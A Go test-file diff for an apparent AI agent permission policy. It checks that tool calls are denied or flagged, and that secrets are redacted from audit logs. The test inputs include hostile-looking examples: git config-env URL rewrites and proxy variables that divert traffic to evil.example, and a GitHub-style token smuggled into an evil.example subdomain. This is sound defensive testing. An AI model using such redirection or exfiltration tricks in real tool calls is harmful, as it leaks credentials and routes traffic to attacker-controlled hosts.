@@ -263,6 +263,145 @@ func TestPermissionPolicyRejectsAllowlistedGitExecutionEnvironment(t *testing.T)
 	require.Contains(t, decision.Reason, "environment.code_injection")
 }
 
+func TestPermissionPolicyScansGitConfigEnvURLRewrites(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"git"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	guardPolicy.EnvAllowlist = append(guardPolicy.EnvAllowlist, "REWRITE_URL")
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name      string
+		arguments string
+		want      tool.PermissionAction
+		wantRule  string
+	}{
+		{
+			name: "rewrite from environment",
+			arguments: `{"command":"git --config-env=url.https://evil.example/.insteadOf=REWRITE_URL ` +
+				`clone https://github.com/org/repo",` +
+				`"env":{"REWRITE_URL":"https://github.com/"}}`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination_override",
+		},
+		{
+			name: "separate config env argument",
+			arguments: `{"command":"git --config-env url.https://evil.example/.insteadOf=REWRITE_URL ` +
+				`clone https://github.com/org/repo",` +
+				`"env":{"REWRITE_URL":"https://github.com/"}}`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination_override",
+		},
+		{
+			name: "missing rewrite environment",
+			arguments: `{"command":"git --config-env=url.https://evil.example/.insteadOf=MISSING ` +
+				`clone https://github.com/org/repo"}`,
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
+		},
+		{
+			name: "empty rewrite prefix",
+			arguments: `{"command":"git --config-env=url.https://evil.example/.insteadOf=REWRITE_URL ` +
+				`clone https://github.com/org/repo",` +
+				`"env":{"REWRITE_URL":""}}`,
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			decision, err := policy.CheckToolPermission(
+				context.Background(), workspacePermissionRequest(tc.arguments),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			require.Contains(t, decision.Reason, tc.wantRule)
+		})
+	}
+}
+
+func TestPermissionPolicyValidatesAllowlistedProxyEnvironment(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"curl"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	guardPolicy.EnvAllowlist = append(
+		guardPolicy.EnvAllowlist,
+		"HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY",
+	)
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name      string
+		arguments string
+		want      tool.PermissionAction
+		wantRule  string
+	}{
+		{
+			name: "scheme-specific proxy",
+			arguments: `{"command":"curl https://api.github.com/data",` +
+				`"env":{"HTTPS_PROXY":"https://evil.example:8443"}}`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name: "all proxy",
+			arguments: `{"command":"curl https://api.github.com/data",` +
+				`"env":{"ALL_PROXY":"socks5h://evil.example:1080"}}`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name: "allowlisted proxy",
+			arguments: `{"command":"curl https://api.github.com/data",` +
+				`"env":{"HTTP_PROXY":"https://proxy.github.com:8443"}}`,
+			want: tool.PermissionActionAllow,
+		},
+		{
+			name: "unparseable proxy",
+			arguments: `{"command":"curl https://api.github.com/data",` +
+				`"env":{"HTTPS_PROXY":"http://[::1"}}`,
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
+		},
+		{
+			name: "scheme-less proxy user info",
+			arguments: `{"command":"curl https://api.github.com/data",` +
+				`"env":{"HTTP_PROXY":"github.com:password@evil.example:8080"}}`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			decision, err := policy.CheckToolPermission(
+				context.Background(), workspacePermissionRequest(tc.arguments),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyPreservesNonAllowlistedProxyRule(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"curl"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	decision, err := policy.CheckToolPermission(
+		context.Background(),
+		workspacePermissionRequest(
+			`{"command":"curl https://api.github.com/data",`+
+				`"env":{"HTTPS_PROXY":"https://evil.example:8443"}}`,
+		),
+	)
+
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, "environment.variable")
+}
+
 func TestPermissionPolicySkillWriteStdinSemantics(t *testing.T) {
 	guard := mustPermissionGuard(t, DefaultPolicy())
 	tests := []struct {
@@ -653,6 +792,135 @@ func TestPermissionPolicyReviewsDestructiveOpaqueTool(t *testing.T) {
 	})
 	require.Equal(t, DecisionDeny, report.Decision)
 	require.Equal(t, "dangerous.rm_rf", report.RuleID)
+}
+
+func TestPermissionPolicyScansSecretsInOpaqueArguments(t *testing.T) {
+	guard := mustPermissionGuard(t, DefaultPolicy())
+	const (
+		token      = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
+		privateKey = "-----BEGIN PRIVATE KEY-----\nsecret-material\n-----END PRIVATE KEY-----"
+	)
+
+	for _, tc := range []struct {
+		name     string
+		secret   string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{"token", token, tool.PermissionActionAsk, "sensitive.secret"},
+		{"private key", privateKey, tool.PermissionActionDeny, "sensitive.private_key"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			sink := &recordingAuditSink{}
+			policy := NewPermissionPolicy(guard, WithAuditSink(sink))
+			req := &tool.PermissionRequest{
+				Tool:     declarationOnlyTool("remote_action", "envelope"),
+				ToolName: "remote_action",
+				Arguments: mustJSON(t, map[string]any{
+					"envelope": map[string]any{"opaque_blob": tc.secret},
+				}),
+				Metadata: tool.ToolMetadata{OpenWorld: true},
+			}
+
+			decision, err := policy.CheckToolPermission(context.Background(), req)
+
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			require.Contains(t, decision.Reason, tc.wantRule)
+			events := sink.snapshot()
+			require.Len(t, events, 1)
+			require.Equal(t, tc.wantRule, events[0].RuleID)
+			require.True(t, events[0].Redacted)
+			encoded, encodeErr := json.Marshal(struct {
+				Decision tool.PermissionDecision `json:"decision"`
+				Event    AuditEvent              `json:"event"`
+			}{decision, events[0]})
+			require.NoError(t, encodeErr)
+			require.NotContains(t, string(encoded), tc.secret)
+		})
+	}
+
+	t.Run("map key", func(t *testing.T) {
+		sink := &recordingAuditSink{}
+		policy := NewPermissionPolicy(guard, WithAuditSink(sink))
+		req := &tool.PermissionRequest{
+			Tool:     declarationOnlyTool("remote_action", "envelope"),
+			ToolName: "remote_action",
+			Arguments: mustJSON(t, map[string]any{
+				"envelope": map[string]any{token: "opaque"},
+			}),
+			Metadata: tool.ToolMetadata{OpenWorld: true},
+		}
+
+		decision, err := policy.CheckToolPermission(context.Background(), req)
+
+		require.NoError(t, err)
+		require.Equal(t, tool.PermissionActionAsk, decision.Action)
+		require.Contains(t, decision.Reason, "sensitive.secret")
+		events := sink.snapshot()
+		require.Len(t, events, 1)
+		require.True(t, events[0].Redacted)
+		encoded, encodeErr := json.Marshal(events[0])
+		require.NoError(t, encodeErr)
+		require.NotContains(t, string(encoded), token)
+	})
+}
+
+func TestPermissionPolicyMarksAdditionalOpaqueSecretsRedacted(t *testing.T) {
+	const token = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
+	sink := &recordingAuditSink{}
+	policy := NewPermissionPolicy(
+		mustPermissionGuard(t, DefaultPolicy()), WithAuditSink(sink),
+	)
+	req := &tool.PermissionRequest{
+		Tool:     declarationOnlyTool("workspace_exec", "command", "payload"),
+		ToolName: "workspace_exec",
+		Arguments: mustJSON(t, map[string]any{
+			"command": "go test ./tool/safety",
+			"payload": map[string]any{"opaque_blob": token},
+		}),
+		Metadata: tool.ToolMetadata{OpenWorld: true},
+	}
+
+	decision, err := policy.CheckToolPermission(context.Background(), req)
+
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionAsk, decision.Action)
+	require.Contains(t, decision.Reason, "sensitive.secret")
+	events := sink.snapshot()
+	require.Len(t, events, 1)
+	require.Equal(t, "sensitive.secret", events[0].RuleID)
+	require.True(t, events[0].Redacted)
+	encoded, encodeErr := json.Marshal(events[0])
+	require.NoError(t, encodeErr)
+	require.NotContains(t, string(encoded), token)
+}
+
+func TestDecodedPermissionReportRedactsAdditionalOpaqueFindings(t *testing.T) {
+	const token = "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"go"}
+	guard := mustPermissionGuard(t, guardPolicy)
+	req := &tool.PermissionRequest{
+		Tool:     declarationOnlyTool("workspace_exec", "command", "endpoint"),
+		ToolName: "workspace_exec",
+		Arguments: mustJSON(t, map[string]any{
+			"command":  "go test ./tool/safety",
+			"endpoint": "https://" + token + ".evil.example/path",
+		}),
+		Metadata: tool.ToolMetadata{OpenWorld: true},
+	}
+	decoded, scan, err := requestFromPermissionRequest(req)
+	require.NoError(t, err)
+	require.True(t, scan)
+
+	report := scanDecodedPermissionRequest(guard, decoded)
+
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.True(t, report.Redacted)
+	encoded, encodeErr := json.Marshal(report)
+	require.NoError(t, encodeErr)
+	require.NotContains(t, string(encoded), token)
 }
 
 func TestPermissionPolicyScansPathBearingArguments(t *testing.T) {
